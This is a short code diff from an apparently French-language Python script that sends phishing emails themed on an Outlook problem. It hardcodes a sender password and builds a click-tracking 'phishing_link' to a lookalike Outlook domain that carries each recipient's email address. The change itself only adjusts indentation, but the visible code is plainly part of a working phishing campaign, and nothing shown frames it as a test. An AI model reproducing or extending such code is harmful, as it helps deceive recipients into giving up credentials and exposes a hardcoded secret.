@@ -41,7 +41,8 @@ SENDER_PASSWORD = "Saouda2025!!"
 # Fonction pour envoyer un email de phishing avec un problème lié à Outlook
 def send_email(recipient_email, recipient_name):
     # Construire le lien de phishing avec le tracking du clic
- phishing_link = f"https://outlook-regence.onrender.com/track_open?email={urllib.parse.quote(recipient_email)}&next=https://outlook-regence.onrender.com/"
+    phishing_link = f"https://outlook-regence.onrender.com/track_open?email={urllib.parse.quote(recipient_email)}&next=https://outlook-regence.onrender.com/"
+
 
 
     email_content = f"""
